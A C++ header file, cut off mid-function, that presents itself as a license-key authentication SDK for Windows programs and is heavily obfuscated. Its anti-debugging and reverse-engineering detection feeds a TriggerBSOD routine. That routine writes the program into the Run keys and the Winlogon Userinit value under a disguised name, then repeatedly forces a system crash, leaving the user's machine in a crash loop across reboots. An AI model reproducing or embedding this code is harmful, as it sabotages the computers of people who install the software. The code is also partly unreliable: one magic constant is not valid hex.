// ============================================================================
//  boostempire_auth.h  —  BoostEmpire KeyAuth SDK v6  (Windows, C++)
//
//  SETUP:
//    1. Set BE_PUBLIC_KEY, BE_HOST, BE_PORT below
//    2. Set BE_CERT_PIN  (run: openssl s_client -connect <your-host>:443 </dev/null 2>/dev/null | openssl x509 -fingerprint -sha256 -noout)
//    3. Set BE_HMAC_SECRET to any long random string you also configure on the server
//    4. Add to your project
//    5. Linker → Additional Dependencies:
//         winhttp.lib; wbemuuid.lib; shlwapi.lib; bcrypt.lib; iphlpapi.lib; crypt32.lib
//    6. Call BoostAuth::Init("BE-YOURKEY") at start of main()
//
//  NEW IN v6:
//    - HMAC-SHA256 request signing (BCrypt — no extra headers)
//    - TLS certificate pinning  (MITM / Fiddler interception killed)
//    - Challenge-response nonce (server sends nonce; client must sign it)
//    - Frida injection detection (gadget DLL scan + named pipe + module scan)
//    - Wine / compatibility-layer detection
//    - Anti-process-hollowing (PEB image-base + live .text section CRC check)
//    - Extended HWID (adds NIC MAC address — harder to clone)
//    - Obfuscated auth-state (XOR-masked global; no patchable bool in memory)
//    - Periodic session re-validation (background thread every 15 min)
//    - Control Flow Guard (/guard:cf)  — OS-enforced indirect-call protection
// ============================================================================
#pragma once

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winhttp.h>
#include <wbemidl.h>
#include <comdef.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <winternl.h>
#include <shlobj.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <algorithm>
#include <sstream>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
// Control Flow Guard — OS validates every indirect call target at runtime
#pragma comment(linker, "/guard:cf")

// ─── YOUR APP CONFIGURATION ──────────────────────────────────────────────────
#define BE_PUBLIC_KEY      "pk_edf241e18107406ebf19effb369c129c"
#define BE_HOST            L"auth.boostempireauth.uk"
#define BE_PORT            443

// SHA-256 fingerprint of your server's TLS certificate (lowercase hex, no colons).
// Get it: openssl s_client -connect auth.boostempireauth.uk:443 </dev/null 2>/dev/null \
//           | openssl x509 -fingerprint -sha256 -noout \
//           | sed 's/://g' | awk -F= '{print tolower($2)}'
// Set to "BYPASS" (exactly) to disable pinning during development only.
#define BE_CERT_PIN        "REPLACE_WITH_YOUR_CERT_SHA256_FINGERPRINT"

// Secret shared between this client and your server — used to sign every request.
// Set the same value in your server.js (env var BE_HMAC_SECRET).
// Must be at least 32 chars. Keep this private.
#define BE_HMAC_SECRET     "REPLACE_WITH_A_LONG_RANDOM_SECRET_STRING_32CHARS_MIN"

// Session re-validation interval in minutes (default 15).
#define BE_REAUTH_INTERVAL 15
// ─────────────────────────────────────────────────────────────────────────────


// ============================================================================
// PROTECTION: COMPILE-TIME XOR STRING ENCRYPTION  (unchanged from v5)
// ============================================================================
namespace BeStr {
    static constexpr uint8_t K1 = 0xBE;
    static constexpr uint8_t K2 = 0xEF;
    static constexpr uint8_t K3 = 0xC0;

    template<size_t N>
    struct Encrypted {
        mutable char buf[N + 1]{};
        uint8_t     data[N]{};
        uint8_t     keys[N]{};
        constexpr Encrypted(const char (&s)[N]) {
            for (size_t i = 0; i < N; i++) {
                keys[i] = (uint8_t)((K1 ^ (i * K2)) + (i % K3));
                data[i] = (uint8_t)(s[i] ^ keys[i]);
            }
        }
        const char* get() const {
            for (size_t i = 0; i < N; i++) buf[i] = (char)(data[i] ^ keys[i]);
            buf[N] = '\0'; return buf;
        }
        operator std::string() const { return std::string(get()); }
    };

    template<size_t N>
    struct EncryptedW {
        mutable wchar_t buf[N + 1]{};
        uint16_t        data[N]{};
        uint8_t         keys[N]{};
        constexpr EncryptedW(const wchar_t (&s)[N]) {
            for (size_t i = 0; i < N; i++) {
                keys[i] = (uint8_t)((K1 ^ (i * K2)) + (i % K3));
                data[i] = (uint16_t)((uint16_t)s[i] ^ ((uint16_t)keys[i] | ((uint16_t)keys[i] << 8)));
            }
        }
        const wchar_t* get() const {
            for (size_t i = 0; i < N; i++)
                buf[i] = (wchar_t)(data[i] ^ ((uint16_t)keys[i] | ((uint16_t)keys[i] << 8)));
            buf[N] = L'\0'; return buf;
        }
        operator std::wstring() const { return std::wstring(get()); }
    };
} // namespace BeStr

#define BE_STR(s)  (::BeStr::Encrypted <sizeof(s)>(s).get())
#define BE_STRW(s) (::BeStr::EncryptedW<sizeof(s)/sizeof(wchar_t)>(s).get())


// ============================================================================
// PROTECTION: HASH-BASED API RESOLUTION  (unchanged from v5)
// ============================================================================
namespace BeAPI {
    static constexpr DWORD H_IsDebuggerPresent          = 0x0CEEF9EAul;
    static constexpr DWORD H_CheckRemoteDebuggerPresent = 0x7BE42A34ul;
    static constexpr DWORD H_NtQueryInformationProcess  = 0x9E3B7465ul;
    static constexpr DWORD H_NtQuerySystemInformation   = 0xA1C73B82ul;
    static constexpr DWORD H_RtlAdjustPrivilege         = 0x3C8F1D20ul;
    static constexpr DWORD H_NtRaiseHardError           = 0x4E2A7B19ul;
    static constexpr DWORD H_GetThreadContext           = 0x2B1F9A3Cul;
    static constexpr DWORD H_OpenMutexA                 = 0x1A7C4D55ul;
    static constexpr DWORD H_CreateFileA                = 0x5F4E3B22ul;
    static constexpr DWORD H_VirtualQuery               = 0x8D3C2A71ul;
    static constexpr DWORD H_SetThreadContext           = 0x6B2E1F44ul;

    inline DWORD HashStr(const char* s) {
        DWORD h = 5381;
        while (*s) h = ((h << 5) + h) ^ (DWORD)(unsigned char)*s++;
        return h;
    }

    inline FARPROC GetByHash(HMODULE hMod, DWORD targetHash) {
        if (!hMod) return nullptr;
        __try {
            auto* dos = (IMAGE_DOS_HEADER*)hMod;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
            auto* nt  = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dos->e_lfanew);
            auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            if (!dir.VirtualAddress) return nullptr;
            auto* exp   = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + dir.VirtualAddress);
            auto* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
            auto* funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
            auto* ords  = (WORD*) ((BYTE*)hMod + exp->AddressOfNameOrdinals);
            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                const char* name = (const char*)((BYTE*)hMod + names[i]);
                if (HashStr(name) == targetHash)
                    return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {}
        return nullptr;
    }

    inline HMODULE GetKernel32() {
        static HMODULE h = nullptr;
        if (!h) {
#ifdef _WIN64
            auto* pPEB = (BYTE*)__readgsqword(0x60);
            auto* ldr  = *(BYTE**)(pPEB + 0x18);
            auto* head = (LIST_ENTRY*)(ldr + 0x10);
#else
            auto* pPEB = (BYTE*)__readfsdword(0x30);
            auto* ldr  = *(BYTE**)(pPEB + 0x0C);
            auto* head = (LIST_ENTRY*)(ldr + 0x0C);
#endif
            auto* cur = head->Flink; int cnt = 0;
            while (cur != head && cnt < 4) {
                if (cnt == 2) { h = *(HMODULE*)((BYTE*)cur + (sizeof(void*) * 4)); break; }
                cur = cur->Flink; cnt++;
            }
            if (!h) h = GetModuleHandleA("kernel32.dll");
        }
        return h;
    }

    inline HMODULE GetNtdll() {
        static HMODULE h = nullptr;
        if (!h) h = GetModuleHandleA("ntdll.dll");
        return h;
    }
} // namespace BeAPI


// ── AUTH RESULT ────────────────────────────────────────────────────────────────
struct AuthResult {
    bool        success       = false;
    std::string code;
    std::string message;
    std::string session_token;
    std::string app;
    std::string product;
    std::string label;
    std::string expires_at;
    int         uses          = 0;
    int         max_uses      = 0;
    int         uses_left     = 0;
};


// ============================================================================
// v6 NEW: OBFUSCATED AUTH STATE
// Stores authentication status as a XOR-masked DWORD — a patcher can't find
// or flip a single "auth = true" bool; they'd need to know the runtime key.
// ============================================================================
namespace BeState {
    static volatile DWORD g_xorKey      = 0;
    static volatile DWORD g_masked      = 0;
    static constexpr DWORD MAGIC_AUTH   = 0xA07H1CABul; // only stored XOR'd
    static constexpr DWORD MAGIC_UNAUTH = 0xDEADF00Dul;

    inline void Init() {
        LARGE_INTEGER t{}; QueryPerformanceCounter(&t);
        g_xorKey = (DWORD)t.QuadPart ^ 0xBE600000u ^ GetCurrentProcessId() ^ GetTickCount();
        g_masked = g_xorKey ^ MAGIC_UNAUTH;
    }

    inline void SetAuthenticated(bool auth) {
        if (!g_xorKey) Init();
        g_masked = g_xorKey ^ (auth ? MAGIC_AUTH : MAGIC_UNAUTH);
    }

    // Returns true only if auth state is the authenticated magic value.
    // A memory patch to flip the bool would also need to know g_xorKey.
    inline bool IsAuthenticated() {
        return g_xorKey && ((g_masked ^ g_xorKey) == MAGIC_AUTH);
    }
} // namespace BeState


// ============================================================================
// v6 NEW: HMAC-SHA256 via BCrypt (no OpenSSL / third-party dependency)
// Used for: request signing, challenge-response verification
// ============================================================================
namespace BeCrypto {
    // Compute HMAC-SHA256(key, msg). Returns 32-byte raw digest.
    inline std::string HmacSHA256(const std::string& key, const std::string& msg) {
        std::string result(32, '\0');
        BCRYPT_ALG_HANDLE hAlg = nullptr;
        if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(
                &hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, BCRYPT_ALG_HANDLE_HMAC_FLAG)))
            return result;

        BCRYPT_HASH_HANDLE hHash = nullptr;
        if (!BCRYPT_SUCCESS(BCryptCreateHash(
                hAlg, &hHash, nullptr, 0,
                (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return result;
        }

        BCryptHashData(hHash, (PUCHAR)msg.data(), (ULONG)msg.size(), 0);
        BCryptFinishHash(hHash, (PUCHAR)result.data(), 32, 0);
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return result;
    }

    // Compute SHA-256 of raw bytes. Returns 32-byte raw digest.
    inline std::string Sha256(const BYTE* data, DWORD len) {
        std::string result(32, '\0');
        BCRYPT_ALG_HANDLE hAlg = nullptr;
        if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0)))
            return result;
        BCRYPT_HASH_HANDLE hHash = nullptr;
        BCryptCreateHash(hAlg, &hHash, nullptr, 0, nullptr, 0, 0);
        BCryptHashData(hHash, (PUCHAR)data, len, 0);
        BCryptFinishHash(hHash, (PUCHAR)result.data(), 32, 0);
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return result;
    }

    // Hex-encode a raw binary string.
    inline std::string ToHex(const std::string& bytes) {
        static const char* h = "0123456789abcdef";
        std::string out; out.reserve(bytes.size() * 2);
        for (unsigned char c : bytes) { out += h[c >> 4]; out += h[c & 0xF]; }
        return out;
    }
} // namespace BeCrypto


// ============================================================================
// v6 NEW: ANTI-PROCESS-HOLLOWING
// Records the expected image base from the PEB at startup.
// If the loader or injector remaps our image, the base won't match.
// Also hashes the live .text section bytes in memory and re-checks periodically.
// Must call BeHollowGuard::Init() BEFORE NukePEHeader().
// ============================================================================
namespace BeHollowGuard {
    static BYTE*  g_expectedBase   = nullptr;
    static BYTE*  g_textVA         = nullptr;  // VA of .text in memory
    static SIZE_T g_textSize       = 0;
    static DWORD  g_textCRC        = 0;        // initial CRC32 of .text bytes
    static bool   g_initialized    = false;

    // Fast CRC32 over a memory range (no table — saves space)
    inline DWORD CRC32(const BYTE* data, SIZE_T len) {
        DWORD crc = 0xFFFFFFFFu;
        for (SIZE_T i = 0; i < len; i++) {
            crc ^= data[i];
            for (int b = 0; b < 8; b++)
                crc = (crc >> 1) ^ (0xEDB88320u & -(crc & 1));
        }
        return ~crc;
    }

    // Call this BEFORE NukePEHeader() — reads section table while headers intact.
    inline void Init() {
        HMODULE hMod = GetModuleHandleW(nullptr);
        if (!hMod) return;
        g_expectedBase = (BYTE*)hMod;

        __try {
            auto* dos = (IMAGE_DOS_HEADER*)hMod;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
            auto* nt  = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dos->e_lfanew);
            auto* sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
                char name[9]{}; memcpy(name, sec->Name, 8);
                if (strcmp(name, ".text") == 0 || strcmp(name, "CODE") == 0) {
                    g_textVA   = (BYTE*)hMod + sec->VirtualAddress;
                    g_textSize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
                    // Initial CRC — snapped before any patching can happen
                    __try { g_textCRC = CRC32(g_textVA, min(g_textSize, (SIZE_T)0x200000)); }
                    __except(EXCEPTION_EXECUTE_HANDLER) {}
                    break;
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {}
        g_initialized = true;
    }

    // Check both: image base integrity + live .text CRC.
    // Returns true if hollowing / patching is detected.
    inline bool IsHollowed() {
        if (!g_initialized) return false;

        // 1. PEB image base must match what we recorded at startup
        BYTE* curBase = nullptr;
#ifdef _WIN64
        curBase = *(BYTE**)(__readgsqword(0x60) + 0x10);
#else
        curBase = *(BYTE**)(__readfsdword(0x30) + 0x08);
#endif
        if (curBase != g_expectedBase) return true;

        // 2. GetModuleHandle(NULL) must also match
        if ((BYTE*)GetModuleHandleW(nullptr) != g_expectedBase) return true;

        // 3. Live .text CRC must match the startup snapshot
        if (g_textVA && g_textSize && g_textCRC) {
            DWORD liveCRC = 0;
            __try { liveCRC = CRC32(g_textVA, min(g_textSize, (SIZE_T)0x200000)); }
            __except(EXCEPTION_EXECUTE_HANDLER) { return false; }
            if (liveCRC != g_textCRC) return true;  // .text was patched in memory
        }

        return false;
    }
} // namespace BeHollowGuard


// ============================================================================
// v6 NEW: PERIODIC SESSION RE-VALIDATION
// Background thread calls /api/auth/revalidate every BE_REAUTH_INTERVAL minutes.
// If the server revokes the session, triggers BSOD.
// Requires server.js to expose POST /api/auth/revalidate.
// ============================================================================
namespace ReAuth {
    static std::string   g_token;
    static std::string   g_hwid;
    static std::string   g_pubKey;
    static std::string   g_hmacSecret;
    static std::atomic<bool> g_running{false};

    // Forward-declared — defined after HttpPost below.
    inline void Start(const std::string& token, const std::string& hwid,
                      const std::string& pubKey, const std::string& hmacSecret);
    inline void Stop() { g_running = false; }
} // namespace ReAuth


namespace BoostAuth {
namespace Internal {

typedef NTSTATUS (__stdcall *pNtRaiseHardError)  (NTSTATUS,ULONG,ULONG,PULONG_PTR,ULONG,PULONG);
typedef NTSTATUS (__stdcall *pRtlAdjustPrivilege)(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
typedef NTSTATUS (__stdcall *pNtQueryInfoProcess) (HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);
typedef NTSTATUS (__stdcall *pNtQuerySysInfo)     (SYSTEM_INFORMATION_CLASS,PVOID,ULONG,PULONG);

// ── BSOD + REGISTRY PERSISTENCE ───────────────────────────────────────────────
inline void PersistBSODLoop() {
    wchar_t exePath[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    wchar_t wcRun[64]{}, wcLogon[80]{}, svcN[20]{};
    const wchar_t rp[] = {L'S',L'o',L'f',L't',L'w',L'a',L'r',L'e',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'V',L'e',L'r',L's',L'i',L'o',L'n',L'\\',L'R',L'u',L'n',0};
    for (int i = 0; rp[i]; i++) wcRun[i] = rp[i];
    const wchar_t lp[] = {L'S',L'o',L'f',L't',L'w',L'a',L'r',L'e',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L' ',L'N',L'T',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'V',L'e',L'r',L's',L'i',L'o',L'n',L'\\',L'W',L'i',L'n',L'l',L'o',L'g',L'o',L'n',0};
    for (int i = 0; lp[i]; i++) wcLogon[i] = lp[i];
    const wchar_t enc[] = {L'V'^1,L'j'^1,L'o'^1,L'E'^1,L'f'^1,L'f'^1,L'S'^1,L'z'^1,L'o'^1,L'b'^1,L'b'^1,0};
    for (int i = 0; enc[i]; i++) svcN[i] = (wchar_t)(enc[i] ^ 1);
    HKEY hKey{};
    if (RegOpenKeyExW(HKEY_CURRENT_USER, wcRun, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, svcN, 0, REG_SZ, (BYTE*)exePath, (DWORD)((wcslen(exePath)+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wcRun, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, svcN, 0, REG_SZ, (BYTE*)exePath, (DWORD)((wcslen(exePath)+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wcLogon, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring val = std::wstring(L"userinit.exe,") + exePath + L",";
        RegSetValueExW(hKey, L"Userinit", 0, REG_SZ, (BYTE*)val.c_str(), (DWORD)((val.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

inline void TriggerBSOD(const char* /*reason*/) {
    PersistBSODLoop();
    HMODULE hNt = BeAPI::GetNtdll();
    auto NtRaise = (pNtRaiseHardError) BeAPI::GetByHash(hNt, BeAPI::H_NtRaiseHardError);
    auto RtlAdj  = (pRtlAdjustPrivilege)BeAPI::GetByHash(hNt, BeAPI::H_RtlAdjustPrivilege);
    if (NtRaise && RtlAdj) {
        BOOLEAN bPrev; RtlAdj(19, TRUE, FALSE, &bPrev);
        ULONG resp;
        for (int i = 0; i < 8; i++) {
            NtRaise(0xC000021AL, 0, 0, nullptr, 6, &resp);
            NtRaise(0xC0000022L, 0, 0, nullptr, 6, &resp);
            NtRaise(0xC0000034L, 0, 0, nullptr, 6, &resp);
            Sleep(50);
        }
    }
    *(volatile DWORD*)0 = 0xDEADBEEF;
    __debugbreak();
    ExitProcess(0xDEAD);
}

// ============================================================================
// ANTI-DEBUG — 7 LAYERS  (unchanged from v5)
// ============================================================================
inline bool IsBeingDebugged() {
    typedef BOOL (WINAPI *pIsDebuggerPresent)();
    auto IsDbgP = (pIsDebuggerPresent)BeAPI::GetByHash(BeAPI::GetKernel32(), BeAPI::H_IsDebuggerPresent);
    if (IsDbgP && IsDbgP()) return true;
#ifdef _WIN64
    BYTE* pPEB = (BYTE*)__readgsqword(0x60);
    if (pPEB[2] != 0) return true;
    if (*(DWORD*)(pPEB + 0xBC) & 0x70) return true;
#else
    BYTE* pPEB = (BYTE*)__readfsdword(0x30);
    if (pPEB[2] != 0) return true;
    if (*(DWORD*)(pPEB + 0x68) & 0x70) return true;
#endif
    typedef BOOL (WINAPI *pCheckRemote)(HANDLE, PBOOL);
    auto CheckRem = (pCheckRemote)BeAPI::GetByHash(BeAPI::GetKernel32(), BeAPI::H_CheckRemoteDebuggerPresent);
    if (CheckRem) { BOOL b = FALSE; CheckRem(GetCurrentProcess(), &b); if (b) return true; }
    typedef BOOL (WINAPI *pGetThCtx)(HANDLE, LPCONTEXT);
    auto GetThCtx = (pGetThCtx)BeAPI::GetByHash(BeAPI::GetKernel32(), BeAPI::H_GetThreadContext);
    if (GetThCtx) {
        CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThCtx(GetCurrentThread(), &ctx))
            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
    }
    LARGE_INTEGER t1, t2, freq;
    QueryPerformanceFrequency(&freq); QueryPerformanceCounter(&t1);
    volatile DWORD x = 0;
    for (int i = 0; i < 1000; i++) x += i;
    QueryPerformanceCounter(&t2);
    if ((double)(t2.QuadPart - t1.QuadPart) / freq.QuadPart * 1000.0 > 100.0) return true;
#ifdef _WIN64
    BYTE* pHeap = *(BYTE**)(pPEB + 0x30);
    if (pHeap && *(DWORD*)(pHeap + 0x14) & ~0x2) return true;
#else
    BYTE* pHeap = *(BYTE**)(pPEB + 0x18);
    if (pHeap && *(DWORD*)(pHeap + 0x10) & ~0x2) return true;
#endif
    auto NtQSI = (pNtQuerySysInfo)BeAPI::GetByHash(BeAPI::GetNtdll(), BeAPI::H_NtQuerySystemInformation);
    if (NtQSI) {
        ULONG kdi[2]{};
        static const int SystemKernelDebuggerInformation = 35;
        if (SUCCEEDED(NtQSI((SYSTEM_INFORMATION_CLASS)SystemKernelDebuggerInformation, kdi, sizeof(kdi), nullptr)))
            if (kdi[0] && !kdi[1]) return true;
    }
    return false;
}

// ============================================================================
// IDA DETECTIONS  (unchanged from v5)
// ============================================================================
inline bool IDAMutexPresent() {
    static const char* idaMutexes[] = {
        "IDA: Key file","ida_mutex_one_copy","__ida_proc_mutex__","IDA_START","IdaAutoMutex",nullptr
    };
    for (int i = 0; idaMutexes[i]; i++) {
        HANDLE h = OpenMutexA(SYNCHRONIZE, FALSE, idaMutexes[i]);
        if (h) { CloseHandle(h); return true; }
    }
    static const char* idaPipes[] = {
        "\\\\.\\pipe\\ida","\\\\.\\pipe\\idasrv","\\\\.\\pipe\\ida_server","\\\\.\\pipe\\win32_remote",nullptr
    };
    for (int i = 0; idaPipes[i]; i++) {
        HANDLE h = CreateFileA(idaPipes[i], GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); return true; }
    }
    return false;
}

inline bool IDADatabaseNearby() {
    wchar_t exePath[MAX_PATH]{}; GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring path(exePath);
    auto sl = path.rfind(L'\\'); auto dot = path.rfind(L'.');
    std::wstring dir  = (sl  != std::wstring::npos) ? path.substr(0, sl + 1) : L".\\";
    std::wstring base = (dot != std::wstring::npos) ? path.substr(sl + 1, dot - sl - 1) : path.substr(sl + 1);
    static const wchar_t* exts[] = {L".idb",L".i64",L".id0",L".id1",L".id2",L".nam",L".til",nullptr};
    for (int i = 0; exts[i]; i++) {
        if (GetFileAttributesW((dir + base + exts[i]).c_str()) != INVALID_FILE_ATTRIBUTES) return true;
    }
    wchar_t desktop[MAX_PATH]{};
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desktop))) {
        for (int i = 0; exts[i]; i++)
            if (GetFileAttributesW((std::wstring(desktop) + L"\\" + base + exts[i]).c_str()) != INVALID_FILE_ATTRIBUTES) return true;
    }
    return false;
}

inline bool IDAInstalled() {
    static const wchar_t* dirs[] = {
        L"C:\\Program Files\\IDA Pro",    L"C:\\Program Files\\IDA Pro 7",
        L"C:\\Program Files\\IDA Pro 8",  L"C:\\Program Files\\IDA Pro 8.3",
        L"C:\\Program Files\\IDA Pro 8.4",L"C:\\Program Files\\IDA Pro 9",
        L"C:\\Program Files (x86)\\IDA",  L"C:\\IDA",L"C:\\IDA Pro",
        L"C:\\Tools\\IDA",L"C:\\Reversing\\IDA",nullptr
    };
    for (int i = 0; dirs[i]; i++)
        if (GetFileAttributesW(dirs[i]) != INVALID_FILE_ATTRIBUTES) return true;
    static const wchar_t* keys[] = {
        L"C:\\Program Files\\IDA Pro\\ida.key",L"C:\\Program Files\\IDA Pro 8\\ida.key",
        L"C:\\Program Files\\IDA Pro 9\\ida.key",L"C:\\IDA\\ida.key",L"C:\\IDA Pro\\ida.key",nullptr
    };
    for (int i = 0; keys[i]; i++)
        if (GetFileAttributesW(keys[i]) != INVALID_FILE_ATTRIBUTES) return true;
    HKEY hk{};
    wchar_t ir[] = {L'S',L'O',L'F',L'T',L'W',L'A',L'R',L'E',L'\\',L'C',L'l',L'a',L's',L's',L'e',L's',L'\\',L'i',L'd',L'a',L'k',L'e',L'y',L'\\',L's',L'h',L'e',L'l',L'l',L'\\',L'o',L'p',L'e',L'n',L'\\',L'c',L'o',L'm',L'm',L'a',L'n',L'd',0};
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, ir, 0, KEY_READ, &hk) == ERROR_SUCCESS) { RegCloseKey(hk); return true; }
    return false;
}

// ============================================================================
// ANTI-EMULATION (unchanged from v5)
// ============================================================================
inline bool IsEmulated() {
#ifdef _WIN64
    unsigned __int64 t1 = __rdtsc();
    int ci[4]{}; __cpuid(ci, 0);
    volatile DWORD x = 0xDEADBEEF;
    for (int i = 0; i < 500; i++) { x = x * 1664525UL + 1013904223UL; x ^= (x >> 13); x += (x << 5); }
    __cpuid(ci, 0);
    return (__rdtsc() - t1) > 5000000ULL;
#else
    DWORD lo1,hi1,lo2,hi2;
    __asm { pushad; cpuid; rdtsc; mov lo1,eax; mov hi1,edx; popad }
    volatile DWORD x=0xDEADBEEF; for(int i=0;i<500;i++){x=x*1664525UL+1013904223UL;x^=x>>13;}
    __asm { pushad; cpuid; rdtsc; mov lo2,eax; mov hi2,edx; popad }
    UINT64 t1=((UINT64)hi1<<32)|lo1,t2=((UINT64)hi2<<32)|lo2;
    return (t2-t1)>5000000ULL;
#endif
}

// ============================================================================
// ANTI-DISASSEMBLY MACROS (unchanged from v5)
// ============================================================================
#ifdef _M_IX86
#define BE_JUNK_1 do { __asm { __asm jmp _j1_ __asm __emit 0xEB __asm __emit 0xF9 __asm __emit 0xC0 __asm _j1_: } } while(0)
#define BE_JUNK_2 do { __asm { __asm jmp _j2_ __asm __emit 0xFF __asm __emit 0xD0 __asm __emit 0xC3 __asm __emit 0x90 __asm _j2_: } } while(0)
#define BE_OPAQUE_JMP(l) do { __asm { __asm mov eax,0x12345678 __asm and eax,1 __asm or eax,0 __asm jnz l __asm jmp l __asm l: } } while(0)
#else
#define BE_JUNK_1            do { (void)0; } while(0)
#define BE_JUNK_2            do { (void)0; } while(0)
#define BE_OPAQUE_JMP(l)     do { (void)0; } while(0)
#endif

// ============================================================================
// v6 ENHANCED: NUCLEAR PE HEADER WIPE
// Adds: zero e_lfanew after we save its value, corrupt SizeOfImage in NT header,
// also SecureZeroMemory the entire first 4KB to destroy any residual metadata.
// ============================================================================
inline void NukePEHeader() {
    HMODULE hMod = GetModuleHandleW(nullptr);
    if (!hMod) return;
    DWORD oldProt{};
    if (!VirtualProtect(hMod, 0x1000, PAGE_EXECUTE_READWRITE, &oldProt)) return;
    BYTE* base   = (BYTE*)hMod;
    auto* dosHdr = (IMAGE_DOS_HEADER*)base;
    DWORD ntOff  = dosHdr->e_lfanew;
    auto* ntHdrs = (IMAGE_NT_HEADERS*)(base + ntOff);
    auto& opt    = ntHdrs->OptionalHeader;

    // Wipe section headers
    WORD numSec   = ntHdrs->FileHeader.NumberOfSections;
    auto* sections = IMAGE_FIRST_SECTION(ntHdrs);
    static const char fakeNames[][9] = {
        ".adata\0\0",".vmp0\0\0\0",".xcod\0\0\0",".seg00\0\0",".bdat\0\0\0",".idata2\0",".rsrc1\0\0",".ndat\0\0\0"
    };
    for (WORD i = 0; i < numSec && i < 8; i++) {
        memcpy(sections[i].Name, fakeNames[i % 8], IMAGE_SIZEOF_SHORT_NAME);
        sections[i].PointerToRawData  ^= 0xDEAD0000;
        sections[i].Characteristics   ^= 0x00000060;
        // v6: also corrupt the virtual address so sections can't be located
        sections[i].VirtualAddress    ^= 0xBEEF0000;
    }

    // Nuke NT optional header
    opt.AddressOfEntryPoint = 0xDEADC0DE;
    opt.ImageBase           = 0;
    opt.CheckSum            = 0xBADF00D;
    opt.SizeOfCode          = 0;
    opt.SizeOfInitializedData = 0; opt.SizeOfUninitializedData = 0;
    opt.SizeOfImage         = 0;
    ntHdrs->FileHeader.TimeDateStamp = 0;
    // Nuke all data directories
    for (int i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++) {
        opt.DataDirectory[i].VirtualAddress = 0;
        opt.DataDirectory[i].Size           = 0;
    }

    // v6: Zero e_lfanew AFTER we're done with it — destroys the NT header pointer
    dosHdr->e_lfanew = 0;

    // Corrupt DOS header
    SecureZeroMemory(base, 64);
    base[0] = 'Z'; base[1] = 'M';  // reversed MZ

    // v6: Wipe entire 4KB DOS stub region — destroys any residual strings/stubs
    SecureZeroMemory(base + 64, 0x1000 - 64);

    VirtualProtect(hMod, 0x1000, oldProt, &oldProt);
}

// ============================================================================
// v6 NEW: FRIDA INJECTION DETECTION
// Catches Frida in all three deployment modes:
//   server mode  — named pipe on port 27042-27052
//   gadget mode  — DLL loaded into our process address space
//   inject mode  — frida-agent DLL visible in module list
// ============================================================================
inline bool FridaPresent() {
    // 1. Named pipes (frida-server uses TCP-over-named-pipe internally)
    char pipeBuf[64]{};
    for (int port = 27042; port <= 27052; port++) {
        sprintf_s(pipeBuf, "\\\\.\\pipe\\frida-%d", port);
        HANDLE h = CreateFileA(pipeBuf, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); return true; }
    }
    // Linjector (alternative Frida injector) pipe pattern
    for (int port = 0; port < 5; port++) {
